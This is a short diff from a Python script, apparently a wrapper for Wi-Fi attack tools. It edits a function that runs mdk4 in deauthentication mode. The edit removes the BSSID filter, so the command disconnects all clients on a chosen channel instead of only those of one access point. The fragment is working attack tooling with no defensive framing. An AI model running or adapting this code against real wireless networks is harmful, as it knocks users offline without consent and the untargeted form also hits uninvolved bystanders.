@@ -113,7 +113,7 @@ def run_mdk4():
         print("\nRunning mkd4 attack...")
         # Assuming mkd4 is a command that needs to be run with specific parameters
 
-        subprocess.call(shlex.split(f"mdk4 d -c {target['Channel']} -b {target['BSSID']} -i {interface}"))
+        subprocess.call(shlex.split(f"mdk4 {interface} d -c {target['Channel']} "))
         print("mkd4 command executed (placeholder).")
     except Exception as e:
         print(f"An error occurred: {e}")
